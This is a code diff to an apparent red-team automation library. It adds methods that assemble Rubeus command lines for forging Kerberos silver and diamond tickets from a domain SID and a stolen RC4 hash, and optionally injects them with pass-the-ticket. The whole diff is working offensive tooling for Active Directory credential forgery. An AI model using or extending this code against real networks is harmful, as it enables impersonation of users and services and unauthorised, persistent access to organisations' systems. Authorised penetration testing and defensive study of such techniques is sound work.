@@ -108,3 +108,48 @@ class RubeusBuilder:
         if ptt:
             argv.append("/ptt")
         return argv
+
+    def silver(
+        self,
+        *,
+        service: str,
+        domain: str,
+        sid: str,
+        rc4: str | SecretStr,
+        ptt: bool = False,
+    ) -> list[str]:
+        argv = [
+            self.binary,
+            "silver",
+            f"/service:{service}",
+            f"/domain:{domain}",
+            f"/sid:{sid}",
+            f"/rc4:{secret_value(rc4)}",
+        ]
+        if ptt:
+            argv.append("/ptt")
+        return argv
+
+    def diamond(
+        self,
+        *,
+        user: str,
+        domain: str,
+        sid: str,
+        rc4: str | SecretStr,
+        tgtdeleg: bool = False,
+        ptt: bool = False,
+    ) -> list[str]:
+        argv = [
+            self.binary,
+            "diamond",
+            f"/user:{user}",
+            f"/domain:{domain}",
+            f"/sid:{sid}",
+            f"/rc4:{secret_value(rc4)}",
+        ]
+        if tgtdeleg:
+            argv.append("/tgtdeleg")
+        if ptt:
+            argv.append("/ptt")
+        return argv
